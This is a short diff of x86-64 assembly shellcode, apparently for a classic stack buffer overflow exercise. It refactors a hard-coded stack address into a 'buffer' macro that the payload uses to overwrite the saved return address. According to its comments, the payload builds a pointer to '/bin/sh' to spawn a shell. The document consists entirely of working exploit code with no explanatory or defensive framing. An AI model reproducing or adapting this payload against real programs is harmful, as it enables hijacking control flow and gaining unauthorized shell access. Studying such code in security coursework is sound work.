@@ -4,6 +4,9 @@
 
 #include <sys/syscall.h>
 
+#define buffer 0x7fffffffe910
+#define SUBTRACT(X, Y) (X - Y)
+
 .globl main
         .type   main, @function
 
@@ -14,7 +17,7 @@ main:
         shl     $32, %rcx
 
         xor     %rax, %rax
-        xor     $0xffffe949, %eax
+        xor     $SUBTRACT(buffer, 57), %eax
         xor     %rax, %rcx              /* %rcx=0x00007fffffffdf50 (ptr to str  "/bin/sh") */
 
         xor     %rax, %rax
@@ -40,4 +43,4 @@ main:
         .ascii  "eeee"
         .ascii  "ff"
         // .ascii  "gggg"
-        .quad   0x7fffffffe910           /* buffer ptr (the first instruction of payload), will overwrite real return address */
+        .quad   buffer                   /* buffer ptr (the first instruction of payload), will overwrite real return address */
